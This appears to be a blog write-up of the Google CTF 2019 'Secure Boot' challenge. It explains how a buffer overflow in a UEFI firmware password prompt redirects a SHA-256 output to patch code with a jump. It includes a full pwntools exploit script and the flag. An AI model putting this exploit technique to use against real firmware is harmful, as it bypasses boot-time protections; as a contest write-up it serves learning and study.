---
title: Secure Boot - Google CTF 2019 Quals
date: '2019-06-25 06:51:43'
layout: post
---

> Your task is very simple: just boot this machine. We tried before but we always get 'Security Violation'. For extra fancyness use 'socat -,raw,echo=0 tcp:$IP:$PORT'.
>
> nc secureboot.ctfcompetition.com 1337
> 
> [Download Attachment](https://storage.googleapis.com/gctf-2019-attachments/6b12345f38b464e93636a85a709925a0a4429bd0707695849aed436712da9d09)


*271 Pts, 26 solves, pwn*

The challenge archive contains the following files which looks fairly typical for a qemu challenge.
```
OVMF.fd
run.py
contents/
     boot.nsh
     bzImage
     rootfs.cpio.gz
     startup.nsh
```

The execption to this is the **OVMF.fd** file, which according to binwalk is a UEFI PI Firmware Volume.

```bash
$ binwalk ./OVMF.fd

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             UEFI PI Firmware Volume, volume size: 540672, header size: 0, revision: 0, Variable Storage, GUID: FFF12B8D-7696-4C8B-85A9-2747075B4F50
```

After looking at **run.py** and a bit of googling, I came across [tianocore](https://github.com/tianocore/tianocore.github.io/wiki/OVMF) which states *OVMF is an EDK II based project to enable UEFI support for Virtual Machines. OVMF contains sample UEFI firmware for QEMU and KVM.* which seem to be what we were looking at.

Running **run.py** launche qemu and starts to load a *UEFI Interactive Shell* but fails and exits straight away, just like the challenge discription suggests.

```
UEFI Interactive Shell v2.2
EDK II
UEFI v2.70 (EDK II, 0x00010000)
Mapping table
      FS0: Alias(s):HD1a1:;BLK3:
          PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)/HD(1,MBR,0xBE1AFDFA,0x3F,0xFBFC1)
     BLK0: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x0)/Floppy(0x0)
     BLK1: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x0)/Floppy(0x1)
     BLK2: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)
     BLK4: Alias(s):
          PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)

If Secure Boot is enabled it will verify kernel's integrity and
return 'Security Violation' in case of inconsistency.
Booting...
Script Error Status: Security Violation (line number 5)
```

After trying a few key combinations I found that if you presses **F12** on startup then instead of getting the UEFI shell a different app would be run, this looked much more promising!

```
BdsDxe: loading Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
BdsDxe: starting Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
****************************
*                          *
*   Welcome to the BIOS!   *
*                          *
****************************

Password?
```

The next thing do to was to try and find this app within the firmware image. During the ctf I used [binwalk](https://github.com/ReFirmLabs/binwalk) to extact the LZMA compressed data, then running it once more on the decompressed image showed that it was filled with executable files.
```
448           0x1C0           Microsoft executable, portable (PE)
25036         0x61CC          Unix path: /home/google-ctf/edk2/Build/OvmfX64/RELEASE_GCC5/X64/MdeModulePkg/Core/Pei/PeiMain/DEBUG/PeiCore.dll
25792         0x64C0          Microsoft executable, portable (PE)
32860         0x805C          Unix path: /home/google-ctf/edk2/Build/OvmfX64/RELEASE_GCC5/X64/MdeModulePkg/Universal/PCD/Pei/Pcd/DEBUG/PcdPeim.dll
33344         0x8240          Microsoft executable, portable (PE)
```

I manually searched the decompresed image for **Password?** but found no results, but searching for **P\x00a\x00s\x00s\x00w\x00o\x00r\x00d\x00?\x00** had a hit. 

```
0020f808: 2000 2000 2000 2000 2000 2000 2000 2000 2000 2000 2000 2000   . . . . . . . . . . . .
0020f820: 2000 2000 2000 2000 2000 2a00 0a00 0000 0000 0000 2a00 2000   . . . . .*.........*. .
0020f838: 2000 2000 5700 6500 6c00 6300 6f00 6d00 6500 2000 7400 6f00   . .W.e.l.c.o.m.e. .t.o.
0020f850: 2000 7400 6800 6500 2000 4200 4900 4f00 5300 2100 2000 2000   .t.h.e. .B.I.O.S.!. . .
0020f868: 2000 2a00 0a00 0000 0000 0000 2a00 2a00 2a00 2a00 2a00 2a00   .*.........*.*.*.*.*.*.
0020f880: 2a00 2a00 2a00 2a00 2a00 2a00 2a00 2a00 2a00 2a00 2a00 2a00  *.*.*.*.*.*.*.*.*.*.*.*.
0020f898: 2a00 2a00 2a00 2a00 2a00 2a00 2a00 2a00 2a00 2a00 0a00 0a00  *.*.*.*.*.*.*.*.*.*.....
0020f8b0: 0000 0000 5000 6100 7300 7300 7700 6f00 7200 6400 3f00 0a00  ....P.a.s.s.w.o.r.d.?...
0020f8c8: 0000 2a00 0000 5700 7200 6f00 6e00 6700 2100 2100 0a00 0000  ..*...W.r.o.n.g.!.!.....
0020f8e0: 2500 7300 4f00 7200 6400 6500 7200 0000 68ce ffff 8cce ffff  %.s.O.r.d.e.r...h.......
0020f8f8: 8cce ffff 76ce ffff 8cce ffff 36ce ffff 44ce ffff 5ace ffff  ....v.......6...D...Z...
```

Grabbing the executable that contained the string (from one **MZ** header to the next) we now had an executable that could be analysed. Afterwards the ctf was over I can across a tool called [uefi-firmware-parser](https://github.com/theopolis/uefi-firmware-parser) which is much easier and can just list and extact the files directly!

```bash
uefi-firmware-parser -ecO ./OVMF.fd
...
File 38: 462caa21-7614-4503-836e-8ab6f4662331 type 0x09, attr 0x00, state 0x07, size 0x1beae (114350 bytes), (application)
              Section 0: type 0x10, size 0x1be44 (114244 bytes) (PE32 image section)
              Section 1: type 0x19, size 0x34 (52 bytes) (Raw section)
              Section 2: type 0x15, size 0x10 (16 bytes) (User interface name section)
              Name: UiApp
              Section 3: type 0x14, size 0xe (14 bytes) (Version section section)
...
Wrote: ./OVMF.fd_output/volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0/section3/volume-ee4e5898-3914-4259-9d6e-dc7bd79403cf/file-462caa21-7614-4503-836e-8ab6f4662331/section0.pe
```

The function that checks the password is fairly small, it reads up to 139 characters, sends them to another function, and compares the result to **0xdeadbeef**s. The function that does the calculation has a few constants such as **0xBB67AE856A09E667** and a quick google shows that it is used in sha256, which can be confirmed by checking in gdb using a known string.

```c
int main() {
  struct chars c;
  char buf[128];
  uint64_t res;
  char *dest;
  uint64_t size;
  unsigned short i;
  unsigned uint64_t tries;

  tries = 0;
  size = 32;
  puts("****************************\n");
  puts("*                          *\n");
  puts("*   Welcome to the BIOS!   *\n");
  puts("*                          *\n");
  puts("****************************\n\n");
  dest = alloc();
  while (tries <= 2) {
    i = 0;
    puts("Password?\n");
    while (1) {
      while (1) {
        f res = (*(*(qword_67E6C68 + 48) + 8))(*(qword_67E6C68 + 48), &c);
        if (res >= 0) {
          if (c.char) break;
        }
        if (res == 0x8000000000000006)
          (*(qword_67E6C78 + 96))(1, *(qword_67E6C68 + 48) + 16, &c.res);
      }
      if (c.char == '\r') break;
      if (i <= 139u) buf[++i] = c.char;
      puts("*");
    }
    buf[i] = 0;
    puts("\n");
    sha256(buf, i, dest);
    if (*dest == 0xDEADBEEFDEADBEEF && *(dest + 8) == 0xDEADBEEFDEADBEEF &&
        *(dest + 16) == 0xDEADBEEFDEADBEEF &&
        *(dest + 24) == 0xDEADBEEFDEADBEEF) {
      doSomething(dest);
      return 1;
    }
    puts("W");
    ++tries;
  }
  doSomething(dest);
  return 0;
}
```

Since we probably wont find password that hashes to **0xDEADBEEFDEADBEEF**'s another way is needed. The function reads the 139 characters into a buffer of 128, so we have an easy overflow! We can use the overflow to change **dest** to somewhere else which will cause the hash to be written to an address that we choose. A bit more playing around in gdb and trying to overwrite different places shows that all the addresses are fixed (the password function is at **0x67DAE50**) and the mapping is also **rwx**!

So the plan is to try and find a 32 byte section of code that we can overwrite with a hash that contains a jmp as the first few bytes, which when hit will take us to the successful code path. **0x67DB07B** ended up being a good candidate as it is hit immediatly after an incorrect password attempt and there is enough space that it doesnt break the successful path. We just need to replace **0x67DB07B** with a jump to **0x67DB06F** and we should be in!

```
0x67DB06F                 call    doSomething
0x67DB074                 mov     eax, 1
0x67DB079                 jmp     short done

0x67DB07B                 lea     rcx, strWrong
0x67DB082                 call    puts
0x67DB087                 add     [rsp+0E8h+tries], 1

0x67DB090 loop:
0x67DB090                 cmp     [rsp+0E8h+tries], 2
0x67DB099                 jbe     start
0x67DB09F                 mov     rax, [rsp+0E8h+dest]
0x67DB0A7                 mov     rdi, rax
0x67DB0AA                 call    doSomething
0x67DB0AF                 mov     eax, 0

0x67DB0B4 done:
0x67DB0B4                 add     rsp, 0E8h
0x67DB0BB                 retn
```

Initally the hashes I was generating did not match the ones from the sha256 function, but looking at the paramaters being passed in showed that with the bytes 128-136 of the password were being replaces with null due to `buf[i] = 0;`. Fixing that I was able to generate matching hashes and wrote a quick function to find a sha:

```python
target = 0x67DB07B

def find_sha(check):
    for i in xrange(100000000):
        payload = str(i)
        payload = payload.ljust(128, "a")
        payload += p64(0)
        payload += p32(target)
        if sha256sum(payload)[0:len(check)] == check:
            payload = str(i)
            payload = payload.ljust(136, "a")
            payload += p32(target)
            return payload

payload = find_sha(asm("jmp $-0x17"))
```

The other gotcha was how to send an F12 via python and pwntools. I ended up just launching wireshark and copied that bytes that were sent when I manually typed it through `socat -,raw,echo=0 tcp:secureboot.ctfcompetition.com:1337` and found out that it was `p.send("\x1b\x5b\x32\x34\x7e")`! Combining this all together allows us to skip the password check and takes us to the next stage, but pwntools was not happy displaying the texted based UI. Using the hint fron the challenge description worked a treat!

```bash
$ socat -,raw,echo=0 SYSTEM:"python ./solv.py"

 Standard PC (i440FX + PIIX, 1996)
 pc-i440fx-bionic                                    2.00 GHz
 0.0.0                                               128 MB RAM



   Select Language            <Standard English>         This is the option
                                                         one adjusts to change
 > Device Manager                                        the language for the
 > Boot Manager                                          current system
 > Boot Maintenance Manager

   Continue
   Reset







  ^v=Move Highlight       <Enter>=Select Entry
```

From this menu you can select **Device Manager -> Secure Boot Configuration**, disable **Attempt Secure Boot**, the save and continue.
```

                ���������������������������������������������Ŀ
                �Configuration changed. Reset to apply it Now.�
                �            Press ENTER to reset             �
                �����������������������������������������������
```

This skips the secure boot and starts linux, dropping us into a shell where we can cat the flag! **CTF{pl4y1ng_with_v1rt_3F1_just_4fun}**


*Full exploit script*
```python
#!/usr/bin/env python2
import logging
from pwn import *

"""
Run with:
socat -,raw,echo=0 SYSTEM:"python ./solv.py"
"""

target = 0x67DB07B

def find_sha(check):
    for i in xrange(100000000):
        payload = str(i)
        payload = payload.ljust(128, "a")
        payload += "\x00" * 8
        payload += p32(target)
        if sha256sum(payload)[0:len(check)] == check:
            payload = str(i)
            payload = payload.ljust(136, "a")
            payload += p32(target)
            return payload

def exploit():
    p.sendafter("2J", "\x1b\x5b\x32\x34\x7e"*10)
    payload = find_sha(asm("jmp $-0x17"))
    payload += "\r"

    p.sendafter("Password?", payload)
    p.interactive()

    # CTF{pl4y1ng_with_v1rt_3F1_just_4fun}

if __name__ == "__main__":
    context.terminal = ["tmux", "sp", "-h"]
    context.arch = "amd64"

    if len(sys.argv) > 1:
        p = remote("secureboot.ctfcompetition.com", 1337)
    else:
        fname = "/tmp/lala"
        os.system("cp OVMF.fd %s" % (fname))
        os.system("chmod u+w %s" % (fname))

        p = process(["qemu-system-x86_64", "-s", "-m", "128M", "-drive", "if=pflash,format=raw,file="+fname, "-drive",
                     "file=fat:rw:contents,format=raw", "-net", "none", "-nographic"], env={})

    exploit()

```